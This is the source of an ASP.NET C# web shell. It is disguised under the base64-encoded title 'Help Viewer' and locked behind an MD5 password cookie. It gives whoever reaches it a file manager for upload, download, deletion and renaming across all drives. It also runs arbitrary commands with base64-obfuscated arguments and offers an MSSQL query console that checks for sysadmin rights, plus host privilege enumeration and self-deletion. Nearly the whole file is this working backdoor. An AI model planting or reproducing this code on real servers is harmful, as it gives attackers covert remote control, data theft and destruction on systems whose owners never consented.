<%@ Page Language="C#" Debug="false" Trace="false" ValidateRequest="false" EnableViewStateMac="false" EnableViewState="true" %>

<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Data.OleDb" %>
<%@ Import Namespace="System.Data.Common" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Management" %>
<%@ Import Namespace="Microsoft.Win32" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.DirectoryServices" %>
<%@ Import Namespace="System.ServiceProcess" %>
<%@ Import Namespace="System.Text.RegularExpressions" %>
<%@ Import Namespace="System.Security" %>
<%@ Import Namespace="System.Security.Permissions" %>
<%@ Import Namespace="System.Threading" %>
<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A" %>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A" %>
<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script type="text/javascript">
    function decode_inputs() {
        var getText = document.getElementById('B_TB_CmdArg').value;
        var getText2 = document.getElementById('B_TB_CmdPath').value;
        document.getElementById('B_TB_CmdArg').value = atob(getText);
        document.getElementById('B_TB_CmdPath').value = atob(getText2);

    }
    window.onload = decode_inputs;
    function base64_encode() {
        var getText = document.getElementById('B_TB_CmdArg').value;
        var getText2 = document.getElementById('B_TB_CmdPath').value;
        var base64_encode = btoa(getText);
        var base64_encode2 = btoa(getText2);
        document.getElementById('B_TB_CmdArg').value = base64_encode;
        document.getElementById('B_TB_CmdPath').value = base64_encode2;
    }
</script>
<script runat="server">

    public static string Base64Encode(string plainText)
    {
        var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
        return System.Convert.ToBase64String(plainTextBytes);
    }
    public static string Base64Decode(string base64EncodedData)
    {
        var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
        return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
    }
    public string Version = Base64Decode("SGVscCBWaWV3ZXI=");
    public string Password = "4a01e14152aeddcac536e01319033bf4";
    private string DomainUserName = Base64Decode("YWRtaW5pc3RyYXRvcg==");
    private int CssC = 1;
    private DbConnection conn = null;
    private DbCommand comm = null;
    protected void Page_Load(object sender, EventArgs e)
    {
        JscriptSender(this);
        if (!B_CheckLogin()) { return; }
        if (IsPostBack)
        {
            zcg_GetDriver();
            zcg_SetHeaderInfo();
            string B_Target = Request[Base64Decode("X19FVkVOVFRBUkdFVA==")];
            string B_Path = Request[Base64Decode("X19GaWxl")];
            if (B_Target != "")
            {
                try
                {
                    switch (B_Target)
                    {
                        case "Blstdir":
                            B_File(B_FromBase64(B_Path));
                            break;
                        case "bdldir":
                            bdldir(B_FromBase64(B_Path));
                            break;
                        case "bcrtdir":
                            B_CreateDir(B_Path);
                            break;
                        case "bdlf":
                            bdlf(B_FromBase64(B_Path));
                            break;
                        case "bdelf":
                            bdelf(B_Path);
                            break;
                        case "bkme":
                            bkme();
                            break;
                    }
                    if (B_Target.StartsWith(Base64Decode("emNnX1JlbmFtZQ==")))
                    {
                        zcg_Rename(B_FromBase64(B_Target.Replace(Base64Decode("emNnX1JlbmFtZQ=="), "")), B_Path);
                    }
                    else if (B_Target.StartsWith(Base64Decode("Ql9DRmlsZQ==")))
                    {
                        B_CopyFile(B_FromBase64(B_Target.Replace(Base64Decode("Ql9DRmlsZQ=="), "")), B_Path);
                    }
                }
                catch (Exception ex) { zcg_ShowError(ex); }
            }
        }
        else { B_Main(); }
    }
    protected void DecodeDB(object sender, EventArgs e) {
        
    }
    private void Hide_Div()
    {
        B_D_File.Visible = false;
        B_D_Cmd.Visible = false;
        B_D_Data.Visible = false;
    }
    private bool B_CheckLogin()
    {
        if (Request.Cookies[Version] == null)
        {
            B_Login();
            return false;
        }
        else
        {
            if (Request.Cookies[Version].Value != Password)
            {
                B_Login();
                return false;
            }
            else
            {
                return true;
            }
        }
    }
    private void B_Login()
    {
        B_D_Login.Visible = true;
        B_D_Content.Visible = false;
    }
    protected void B_B_Logout_Click(object sender, EventArgs e)
    {
        Session.Abandon();
        Response.Cookies.Add(new HttpCookie(Version, null));
        B_Login();
    }
    private void B_Main()
    {
        zcg_SetHeaderInfo();
        zcg_GetDriver();
        if (B_TB_Path.Value == "")
        {
            B_TB_Path.Value = B_PathBuild(Server.MapPath("."));
        }
        B_File(B_TB_Path.Value);
    }
    private void zcg_SetHeaderInfo()
    {
        B_D_Content.Visible = true;
        B_D_Login.Visible = false;
        B_bkme.Attributes["onClick"] = Base64Decode("aWYoY29uZmlybSgnT0s/Jykpe0JfUG9zdEJhY2soJ0JfS2lsbE1lJywnJyk7fTs=");
        B_Span_Sname.InnerHtml = Request.ServerVariables["LOCAL_ADDR"] + ":" + Request.ServerVariables["SERVER_PORT"] + "(" + Request.ServerVariables["SERVER_NAME"] + ")" + zcg_CheckPermission();
        B_Span_FrameVersion.InnerHtml = Base64Decode("RnJhbWV3b3JrIFZlciA6IA==") + Environment.Version.ToString();
    }
    private string zcg_CheckPermission()
    {
        string s = Base64Decode("Jm5ic3A7Jm5ic3A7SG9zdCBUcnVzdCBMZXZlbDombmJzcDsmbmJzcDs8c3BhbiBzdHlsZT0nY29sb3I6cmVkOyc+ezB9PC9zcGFuPiZuYnNwOyZuYnNwO0lzRnVsbC1UcnVzdDombmJzcDsmbmJzcDs8c3BhbiBzdHlsZT0nY29sb3I6cmVkOyc+ezF9PC9zcGFuPiZuYnNwOyZuYnNwO1VzZXI6Jm5ic3AmbmJzcDs8c3BhbiBzdHlsZT0nY29sb3I6cmVkOyc+ezJ9PC9zcGFuPg==");
        string u = zcg_GetUserName();
        try { (new PermissionSet(PermissionState.Unrestricted)).Demand(); return string.Format(s, GetTrustLevel(), true, u); }
        catch { return string.Format(s, GetTrustLevel(), false, u); }
    }
    private string zcg_GetUserName()
    {
        try { return System.Security.Principal.WindowsIdentity.GetCurrent().Name; }
        catch { return Base64Decode("VW5rbm93biAtLSBObyBwZXJtaXNzaW9u"); }
    }
    private string GetTrustLevel()
    {
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.Unrestricted).Demand(); return "Full"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.High).Demand(); return "High"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.Medium).Demand(); return "Medium"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.Low).Demand(); return "Low"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.Minimal).Demand(); return "Minimal"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.None).Demand(); return "None"; }
        catch { }
        return "Unknown";
    }
    private string GetTrustLevel2()
    {
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.Unrestricted).Demand(); return "Full"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.High).Demand(); return "High"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.Medium).Demand(); return "Medium"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.Low).Demand(); return "Low"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.Minimal).Demand(); return "Minimal"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.None).Demand(); return "None"; }
        catch { }
        return "Unknown";
    }
    private string GetTrustLevel1()
    {
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.Unrestricted).Demand(); return "Full"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.High).Demand(); return "High"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.Medium).Demand(); return "Medium"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.Low).Demand(); return "Low"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.Minimal).Demand(); return "Minimal"; }
        catch { }
        try { new AspNetHostingPermission(AspNetHostingPermissionLevel.None).Demand(); return "None"; }
        catch { }
        return "Unknown";
    }
    private void zcg_GetDriver()
    {
        string[] drivers = null;
        try { drivers = Directory.GetLogicalDrives(); }
        catch
        {
            string drs = "";
            for (int i = 0x41; i < 0x5b; i++)
            {
                string ds = new string((new char[] { (char)i, ':', '\\' }));
                try
                {
                    DriveInfo di = new DriveInfo(ds);
                    if (di.DriveType != DriveType.NoRootDirectory) { drs += ds + "|"; }
                }
                catch { }
                finally { drivers = drs.Split(new char[] { '|' }, (StringSplitOptions)1); }
            }
        }
        B_Span_Drv.InnerHtml = "";
        for (int i = 0; i < drivers.Length; i++)
        {
            B_Span_Drv.InnerHtml += String.Format("<a href=\"javascript:B_PostBack('Blstdir','{0}')\">{1}</a> | ", B_ToBase64(drivers[i]), B_Drvbuild(drivers[i]));
        }
    }
    private string B_PathBuild(string path)
    {
        if (!path.EndsWith(@"\")) { path += @"\"; }
        return path;
    }
    private string B_Drvbuild(string instr)
    {
        DriveInfo di = new DriveInfo(instr);
        return String.Format("{0}({1}:)", di.DriveType, instr[0]);
    }
    private string B_ToBase64(string instr)
    {
        byte[] tmp = Encoding.UTF8.GetBytes(instr);
        return Convert.ToBase64String(tmp);
    }
    private string B_FromBase64(string instr)
    {
        byte[] tmp = Convert.FromBase64String(instr);
        return Encoding.UTF8.GetString(tmp);
    }
    private TableRow zcg_GetTableRow()
    {
        TableRow tr = new TableRow();
        zcg_SetControlAttribute(tr);
        return tr;
    }
    private void zcg_SetControlAttribute(WebControl ctl)
    {
        string bg = B_Css();
        ctl.Attributes["onmouseover"] = "this.className='focus';";
        ctl.CssClass = bg;
        ctl.Attributes["onmouseout"] = "this.className='" + bg + "';";
    }
    private void B_File(string path)
    {
        try
        {
            Hide_Div();
            B_D_File.Visible = true;
            B_H2_Title.InnerText = "File Manager >>";
            B_TB_Path.Value = B_PathBuild(path);
            path = (path.EndsWith("\\") && (!path.EndsWith(":\\"))) ? path.TrimEnd('\\') : path;
            DirectoryInfo B_dir = new DirectoryInfo(path);
            try
            {
                if (Directory.GetParent(path) != null)
                {
                    TableRow p = zcg_GetTableRow();
                    for (int i = 1; i < 6; i++)
                    {
                        TableCell pc = new TableCell();
                        if (i == 1)
                        {
                            pc.Width = Unit.Parse("2%");
                            pc.Text = "0";
                        }
                        if (i == 2)
                        {
                            pc.Text = "<a href=\"javascript:B_PostBack('Blstdir','" + B_ToBase64(Directory.GetParent(path).ToString()) + "')\">Parent Directory</a>";
                        }
                        p.Cells.Add(pc);
                        B_Table_File.Rows.Add(p);
                    }
                }
            }
            catch { }
            try
            {
                int dir_c = 0;
                foreach (DirectoryInfo B_folder in B_dir.GetDirectories())
                {
                    dir_c++;
                    TableCell tc = new TableCell();
                    tc.Width = Unit.Parse("2%");
                    tc.Text = "0";
                    TableRow tr = zcg_GetTableRow();
                    tr.Cells.Add(tc);
                    TableCell dirname = new TableCell();
                    dirname.Text = "<a href=\"javascript:B_PostBack('Blstdir','" + B_ToBase64(B_TB_Path.Value + B_folder.Name) + "')\">" + B_folder.Name + "</a>";
                    tr.Cells.Add(dirname);
                    TableCell dirtime = new TableCell();
                    dirtime.Text = B_folder.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
                    tr.Cells.Add(dirtime);
                    B_Table_File.Rows.Add(tr);
                    TableCell dirsize = new TableCell();
                    dirsize.Text = "--";
                    tr.Cells.Add(dirsize);
                    B_Table_File.Rows.Add(tr);
                    TableCell diraction = new TableCell();
                    diraction.Text = "<a href=\"javascript:if(confirm('Are you sure will delete it ?\\n\\nIf non-empty directory,will be delete all the files.')){B_PostBack('bdldir','" + B_ToBase64(B_TB_Path.Value + B_folder.Name) + "')};\">Del</a> | <a href='#' onclick=\"var filename=prompt('new folder name:','" + B_folder.Name.Replace("'", "\\'") + "');if(filename){B_PostBack('zcg_Rename" + B_ToBase64(B_TB_Path.Value + B_folder.Name) + "',filename);} \">Rename</a>";
                    tr.Cells.Add(diraction);
                    B_Table_File.Rows.Add(tr);
                }
                TableRow intr = new TableRow();
                intr.Attributes["style"] = "border-top:1px solid #fff;border-bottom:1px solid #ddd;";
                intr.Attributes["bgcolor"] = "#dddddd";
                TableCell intc = new TableCell();
                intc.Attributes["colspan"] = "6";
                intc.Attributes["height"] = "5";
                intr.Cells.Add(intc);
                B_Table_File.Rows.Add(intr);
                int file_c = 0;
                foreach (FileInfo B_Files in B_dir.GetFiles())
                {
                    file_c++;
                    TableRow tr = zcg_GetTableRow();
                    TableCell tc = new TableCell();
                    tc.Width = Unit.Parse("2%");
                    tc.Text = "<input type=\"checkbox\" value=\"0\" name=\"" + B_ToBase64(B_Files.Name) + "\">";
                    tr.Cells.Add(tc);
                    TableCell filename = new TableCell();
                    if (B_Files.FullName.StartsWith(Request.PhysicalApplicationPath))
                    {
                        string url = Request.Url.ToString();
                        filename.Text = "<a href=\"" + B_Files.FullName.Replace(Request.PhysicalApplicationPath, url.Substring(0, url.IndexOf('/', 8) + 1)).Replace("\\", "/") + "\" target=\"_blank\">" + B_Files.Name + "</a>";
                    }
                    else
                    {
                        filename.Text = B_Files.Name;
                    }
                    TableCell filetime = new TableCell();
                    filetime.Text = B_Files.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
                    TableCell filesize = new TableCell();
                    filesize.Text = B_FileSize(B_Files.Length);
                    TableCell action = new TableCell();
                    action.Text = "<a href=\"#\" onclick=\"B_PostBack('bdlf','" + B_ToBase64(B_TB_Path.Value + B_Files.Name) + "')\">Down</a> | <a href='#' onclick=\"var filename=prompt('new path(full path):','" + B_TB_Path.Value.Replace(@"\", @"\\") + B_Files.Name.Replace("'", "\\'") + "');if(filename){B_PostBack('B_CFile" + B_ToBase64(B_TB_Path.Value + B_Files.Name) + "',filename);} \">Copy</a> | <a href='#' onclick=\"var filename=prompt('new file name(full path):','" + B_Files.Name.Replace("'", "\\'") + "');if(filename){B_PostBack('zcg_Rename" + B_ToBase64(B_TB_Path.Value + B_Files.Name) + "',filename);} \">Rename</a>  ";
                    tr.Cells.Add(filename);
                    tr.Cells.Add(filetime);
                    tr.Cells.Add(filesize);
                    tr.Cells.Add(action);
                    B_Table_File.Rows.Add(tr);
                }
                TableRow cktr = zcg_GetTableRow();
                for (int i = 1; i < 4; i++)
                {
                    TableCell cktd = new TableCell();
                    if (i == 1)
                    {
                        cktd.Text = "<input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].type=='checkbox'&&ck[i].name!='chkall'){ck[i].checked=forms[0].chkall.checked;}}\"/>";
                    }
                    if (i == 2)
                    {
                        cktd.Text = "<a href=\"#\" Onclick=\"var d_file='';var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].checked&&ck[i].name!='chkall'){d_file+=ck[i].name+',';}};if(d_file==null || d_file==''){ return;} else {if(confirm('Are you sure delete the files ?')){B_PostBack('bdelf',d_file)};}\">Delete selected</a>";
                    }
                    if (i == 3)
                    {
                        cktd.ColumnSpan = 4;
                        cktd.Style.Add("text-align", "right");
                        cktd.Text = dir_c + " directories/ " + file_c + " files";
                    }
                    cktr.Cells.Add(cktd);
                }
                B_Table_File.Rows.Add(cktr);
            }
            catch (Exception err)
            {
                zcg_ShowError(err);
            }
        }
        catch (Exception ex) { zcg_ShowError(ex); }
    }
    private string B_Css()
    {
        CssC++;
        if (CssC % 2 == 0)
        {
            return "alt1";
        }
        else
        {
            return "alt2";
        }
    }
    private void bdldir(string dirstr)
    {
        try
        {
            Directory.Delete(dirstr, true);
            B_Msg("OK");
        }
        catch (Exception error)
        {
            zcg_ShowError(error);
        }
        B_File(Directory.GetParent(dirstr).ToString());
    }
    private void bdldir1(string dirstr)
    {
        try
        {
            Directory.Delete(dirstr, true);
            B_Msg("OK");
        }
        catch (Exception error)
        {
            zcg_ShowError(error);
        }
        B_File(Directory.GetParent(dirstr).ToString());
    }
    private void zcg_Rename(string source, string dire)
    {
        try
        {
            dire = Path.Combine(B_TB_Path.Value, dire);
            Directory.Move(source, dire);
            B_Msg("OK");
        }
        catch (Exception error)
        {
            B_Msg(error.Message);
        }
        B_File(B_TB_Path.Value);
    }
    private void B_CopyFile(string spath, string dpath)
    {
        try
        {
            File.Copy(spath, dpath);
            B_Msg("OK");
        }
        catch (Exception error)
        {
            zcg_ShowError(error);
        }
        B_File(B_TB_Path.Value);
    }
    private void B_CreateDir(string path)
    {
        try
        {
            Directory.CreateDirectory(B_TB_Path.Value + path);
            B_Msg("OK");
        }
        catch (Exception error)
        {
            zcg_ShowError(error);
        }
        B_File(B_TB_Path.Value);
    }
    private void B_CreateDir2(string path)
    {
        try
        {
            Directory.CreateDirectory(B_TB_Path.Value + path);
            B_Msg("OK");
        }
        catch (Exception error)
        {
            zcg_ShowError(error);
        }
        B_File(B_TB_Path.Value);
    }
    private void bdlf(string path)
    {
        FileStream fs = null;
        byte[] buffer = new byte[0x1000];
        int count = 0;
        try
        {
            FileInfo fi = new FileInfo(path);
            fs = fi.OpenRead();
            Response.Clear();
            Response.ClearHeaders();
            Response.Buffer = false;
            this.EnableViewState = false;
            Response.AddHeader("Content-Disposition", "attachment;filename=" + HttpUtility.UrlEncode(fi.Name, System.Text.Encoding.UTF8));
            Response.AddHeader("Content-Length", fi.Length.ToString());
            Response.ContentType = "application/octet-stream";
            count = fs.Read(buffer, 0, 0x1000);
            while (count > 0)
            {
                Response.OutputStream.Write(buffer, 0, count);
                Response.Flush();
                count = fs.Read(buffer, 0, 0x1000);
            }
            Page.Response.Flush();
            Response.End();
        }
        catch (Exception ex) { zcg_ShowError(ex); }
        finally { if (fs != null) { fs.Close(); } }
    }
    private void bdelf(string path)
    {
        try
        {
            string[] mydata = path.Split(',');
            for (int i = 0; i < mydata.Length - 1; i++)
            {
                File.Delete(B_TB_Path.Value + B_FromBase64(mydata[i]));
            }
            B_Msg("OK");
        }
        catch (Exception error)
        {
            zcg_ShowError(error);
        }
        B_File(B_TB_Path.Value);
    }
    private void bdelf1(string path)
    {
        try
        {
            string[] mydata = path.Split(',');
            for (int i = 0; i < mydata.Length - 1; i++)
            {
                File.Delete(B_TB_Path.Value + B_FromBase64(mydata[i]));
            }
            B_Msg("OK");
        }
        catch (Exception error)
        {
            zcg_ShowError(error);
        }
        B_File(B_TB_Path.Value);
    }
    private void bkme()
    {
        try
        {
            File.Delete(Request.PhysicalPath);
            Response.Redirect("");
        }
        catch (Exception error)
        {
            zcg_ShowError(error);
        }
    }
    private String B_FileSize(Int64 fileSize)
    {
        if (fileSize < 0)
        {
            throw new ArgumentOutOfRangeException("fileSize");
        }
        else if (fileSize >= 1024 * 1024 * 1024)
        {
            return string.Format("{0:########0.00} G", ((Double)fileSize) / (1024 * 1024 * 1024));
        }
        else if (fileSize >= 1024 * 1024)
        {
            return string.Format("{0:####0.00} M", ((Double)fileSize) / (1024 * 1024));
        }
        else if (fileSize >= 1024)
        {
            return string.Format("{0:####0.00} K", ((Double)fileSize) / 1024);
        }
        else
        {
            return string.Format("{0} B", fileSize);
        }
    }
    private DataTable zcg_WmiDataTable(string @namespace, string query)
    {
        ManagementObjectSearcher QS = new ManagementObjectSearcher(@namespace, query);
        return zcg_WmiSearcherToDataTable(QS);
    }
    private DataTable zcg_WmiSearcherToDataTable(ManagementObjectSearcher QS)
    {
        DataTable dt = new DataTable();
        foreach (ManagementObject m in QS.Get())
        {
            DataRow dr = dt.NewRow();
            PropertyDataCollection.PropertyDataEnumerator oEnum;
            oEnum = (m.Properties.GetEnumerator() as PropertyDataCollection.PropertyDataEnumerator);
            while (oEnum.MoveNext())
            {
                PropertyData prop = (PropertyData)oEnum.Current;
                if (dt.Columns.IndexOf(prop.Name) == -1)
                {
                    dt.Columns.Add(prop.Name);
                    dt.Columns[dt.Columns.Count - 1].DefaultValue = "";
                }
                if (m[prop.Name] != null)
                {
                    dr[prop.Name] = m[prop.Name].ToString();
                }
                else
                {
                    dr[prop.Name] = "";
                }
            }
            dt.Rows.Add(dr);
        }
        return dt;
    }
    private void B_DataB()
    {
        Hide_Div();
        B_D_Data.Visible = true;
        B_D_DBPanel.Visible = false;
        B_H2_Title.InnerText = "DataB >>";
    }
    private void OpenConnection()
    {
        conn = new SqlConnection();
        comm = new SqlCommand();
        if (conn.State == ConnectionState.Closed)
        {
            try
            {
                conn.ConnectionString = B_TB_ConnStr.Text;
                comm.Connection = conn;
                conn.Open();
                if (B_List_DB.SelectedItem != null && B_List_DB.SelectedItem.Value != "")
                {
                    conn.ChangeDatabase(B_List_DB.SelectedItem.Value.ToString());
                }
            }
            catch (Exception error)
            {
                zcg_ShowError(error);
            }
        }
    }
    private void CloseConnection()
    {
        if (conn.State == ConnectionState.Open)
        {
            conn.Close();
        }
        conn.Dispose();
        comm.Dispose();
    }
    private DataTable B_DataTable(string sqlstr)
    {
        DbDataAdapter da = null;
        da = new SqlDataAdapter();
        DataTable dtable = new DataTable();
        try
        {
            OpenConnection();
            comm.CommandType = CommandType.Text;
            comm.CommandText = sqlstr;
            da.SelectCommand = comm;
            da.Fill(dtable);
        }
        finally
        {
            CloseConnection();
        }
        return dtable;
    }
    private bool B_ExecSql(string instr)
    {
        try
        {
            OpenConnection();
            comm.CommandType = CommandType.Text;
            comm.CommandText = instr;
            comm.ExecuteNonQuery();
            return true;
        }
        catch (Exception e)
        {
            zcg_ShowError(e);
            return false;
        }
    }
    private void B_ExecBind()
    {
        try
        {
            DataTable dt = B_DataTable(B_Textarea_Query.InnerText);
            if (dt.Columns.Count > 0)
            {
                B_DataGrid.PreRender += new EventHandler(DataGrid_PreRender);
                B_DataGrid.DataSource = dt;
                B_DataGrid.DataBind();
                for (int i = 0; i < B_DataGrid.Items.Count; i++)
                {
                    zcg_SetControlAttribute(B_DataGrid.Items[i]);
                }
            }
            else
            {
                B_DataGrid.DataSource = null;
                B_DataGrid.DataBind();
            }
            B_DataGrid.Visible = true;
        }
        catch (Exception e)
        {
            zcg_ShowError(e);
            B_DataGrid.Visible = false;
        }
    }
    private void B_DataBind()
    {
        try
        {
            if (B_List_DB.SelectedItem.Value == "")
            {
                B_DataGrid.DataSource = null;
                B_DataGrid.DataBind();
                return;
            }
            OpenConnection();
            DataTable tables = new DataTable();
            if (B_List_DB.SelectedItem.Value != "")
            {
                conn.ChangeDatabase(B_List_DB.SelectedItem.Text);
            }
            tables = conn.GetSchema("Tables");
            tables.Columns.Remove("TABLE_CATALOG");
            tables.Columns.Remove("TABLE_SCHEMA");
            B_DataGrid.PreRender += new EventHandler(DataGrid_PreRender);
            B_DataGrid.DataSource = tables;
            B_DataGrid.DataBind();
            for (int i = 0; i < B_DataGrid.Items.Count; i++)
            {
                string tname = B_DataGrid.Items[i].Cells[0].Text;
                zcg_SetControlAttribute(B_DataGrid.Items[i]);
                B_DataGrid.Items[i].Attributes["onclick"] = "ASPX.B_Textarea_Query.value='select * from " + tname + "';";
            }
            B_DataGrid.Visible = true;
        }
        catch (Exception e)
        {
            zcg_ShowError(e);
            B_DataGrid.Visible = false;
        }
    }
    protected void DataGrid_PreRender(object sender, EventArgs e)
    {
        DataGrid d = (DataGrid)sender;
        foreach (DataGridItem item in d.Items)
        {
            foreach (TableCell t in item.Cells)
            {
                t.Text = t.Text.Replace("<", "&lt;").Replace(">", "&gt;");
            }
        }
    }
    private void B_Newconn()
    {
        B_D_DBPanel.Visible = true;
        try
        {
            B_Textarea_Query.InnerHtml = "";
            if (B_List_Connstr.SelectedItem.Text == "MSSQL")
            {
                B_DataGrid.Visible = false;
                B_D_Dblist.Visible = true;
                B_D_Dbinfo.Visible = true;
                OpenConnection();
                string cdb = conn.Database;
                string verstr = B_DataTable(Base64Decode("U0VMRUNUIEBAVkVSU0lPTg==")).Rows[0][0].ToString();
                DataTable dbs = B_DataTable(Base64Decode("U0VMRUNUIG5hbWUgRlJPTSBtYXN0ZXIuLnN5c2RhdGFiYXNlcw=="));
                DataTable rol = B_DataTable(Base64Decode("U0VMRUNUIElTX1NSVlJPTEVNRU1CRVIoJ3N5c2FkbWluJyk="));
                DataTable owner = B_DataTable(Base64Decode("U0VMRUNUIElTX01FTUJFUignZGJfb3duZXInKQ=="));
                string dbo = "";
                if (owner.Rows[0][0].ToString() == "1")
                {
                    dbo = "db_owner";
                }
                else
                {
                    dbo = "public";
                }
                if (rol.Rows[0][0].ToString() == "1")
                {
                    dbo = "<font color=blue>sa</font>";
                }
                B_List_Exec.SelectedIndex = 0;
                B_List_DB.Items.Clear();
                for (int i = 0; i < dbs.Rows.Count; i++)
                {
                    B_List_DB.Items.Add(dbs.Rows[i][0].ToString());
                    if (cdb == dbs.Rows[i][0].ToString())
                    {
                        B_List_DB.Items[i].Selected = true;
                    }
                }
                B_D_Dbinfo.InnerHtml = "<p><font color=red>Version</font> : <i><b>" + verstr + Base64Decode("PC9iPjwvaT48L3A+PHA+PGZvbnQgY29sb3I9cmVkPlNydlJvbGVNZW1iZXI8L2ZvbnQ+IDogPGk+PGI+") + dbo + "</b></i></p>";
            }
            else
            {
                B_D_Dblist.Visible = false;
                B_D_Dbinfo.Visible = false;
            }
            B_DataBind();
        }
        catch (Exception e)
        {
            zcg_ShowError(e);
            B_D_DBPanel.Visible = false;
        }
    }
    public static void JscriptSender(System.Web.UI.Page page)
    {
        page.RegisterHiddenField("__EVENTTARGET", "");
        page.RegisterHiddenField("__FILE", "");
        string s = @"<script language=Javascript>";
        s += @"function B_PostBack(eventTarget,eventArgument)";
        s += @"{";
        s += @"var theform=document.forms[0];";
        s += @"theform.__EVENTTARGET.value=eventTarget;";
        s += @"theform.__FILE.value=eventArgument;";
        s += @"theform.submit();theform.__EVENTTARGET.value="""";theform.__FILE.value=""""";
        s += @"} ";
        s += @"</scr" + "ipt>";
        page.RegisterStartupScript("", s);
    }
    private void B_Msg(string instr)
    {
        B_D_Msg.Visible = true;
        B_D_Msg.InnerHtml = "<pre><xmp>" + instr + "</xmp></pre>";
    }
    private void zcg_ShowError(Exception ex)
    {
        if (ex.InnerException == null) { B_Msg(ex.Message); } else { B_Msg(ex.ToString()); }
    }
    protected void B_B_Login_Click(object sender, EventArgs e)
    {
        string MD5Pass = FormsAuthentication.HashPasswordForStoringInConfigFile(B_TB_Login.Text, "MD5").ToLower();
        if (MD5Pass == Password)
        {
            Response.Cookies.Add(new HttpCookie(Version, Password));
            B_D_Login.Visible = false;
            B_Main();
        }
        else
        {
            B_Login();
        }
    }
    protected void B_B_File_Click(object sender, EventArgs e)
    {
        B_File(Server.MapPath("."));
    }
    protected void B_B_Upload_Click(object sender, EventArgs e)
    {
        string uppath = B_TB_Path.Value;
        uppath = B_PathBuild(uppath);
        try
        {
            if (B_Lable_File.PostedFile.FileName == "") { B_Msg("No File!"); }
            else { B_Lable_File.PostedFile.SaveAs(uppath + Path.GetFileName(B_Lable_File.Value)); B_Msg("OK"); }
        }
        catch (Exception error)
        {
            zcg_ShowError(error);
        }
        B_File(B_TB_Path.Value);
    }
    protected void B_B_Go_Click(object sender, EventArgs e)
    {
        B_File(B_TB_Path.Value);
    }
    protected void B_B_WebRoot_Click(object sender, EventArgs e)
    {
        B_File(Server.MapPath("."));
    }
    protected void B_B_Cmd_Click(object sender, EventArgs e)
    {
        Hide_Div();
        B_D_Cmd.Visible = true;
        B_H2_Title.InnerText = "Execute Command >>";
    }
    protected void B_B_CmdExec_Click(object sender, EventArgs e)
    {
        try { zcg_ExecCmd(); }
        catch (Exception ex) { zcg_ShowError(ex); }
    }
    private void zcg_ExecCmd()
    {
        try
        {
            Process Cmdpro = new Process();
            Cmdpro.StartInfo.FileName = Base64Decode(B_TB_CmdPath.Value);
            Cmdpro.StartInfo.Arguments = Base64Decode(B_TB_CmdArg.Value);
            Cmdpro.StartInfo.UseShellExecute = false;
            Cmdpro.StartInfo.RedirectStandardInput = true;
            Cmdpro.StartInfo.RedirectStandardOutput = true;
            Cmdpro.StartInfo.RedirectStandardError = true;
            Cmdpro.Start();
            string cmdstr = Cmdpro.StandardOutput.ReadToEnd();
            cmdstr += Cmdpro.StandardError.ReadToEnd();
            if (cmd_download_result.Checked == true)
            {
                string tempfilename = Path.GetTempPath() + "\\result.txt";
                StreamWriter sw = new StreamWriter(tempfilename, false, Encoding.Default);
                sw.Write(cmdstr);
                sw.Close();
                bdlf(tempfilename);
                File.Delete(tempfilename);
            }
            else
            {
                B_D_CmdRes.Visible = true;
                B_D_CmdRes.InnerHtml = "<hr width=\"100%\" noshade/><pre><xmp>" + cmdstr + "</xmp></pre>";
            }

        }
        catch (Exception error)
        {
            zcg_ShowError(error);
        }
    }
    protected void B_B_DB_Click(object sender, EventArgs e)
    {
        B_DataB();
    }
    protected void B_List_SelectedIndexChanged(object sender, EventArgs e)
    {
        switch (((Control)sender).ID.ToString())
        {
            case "B_List_Connstr":
                B_D_DBPanel.Visible = false;
                B_TB_ConnStr.Text = B_List_Connstr.SelectedItem.Value.ToString();
                break;
            case "B_B_Show":
            case "B_List_DB":
                B_DataBind();
                break;

        }
    }
    protected void B_B_Back_Click(object sender, EventArgs e)
    {
        B_File(B_TB_Path.Value);
    }
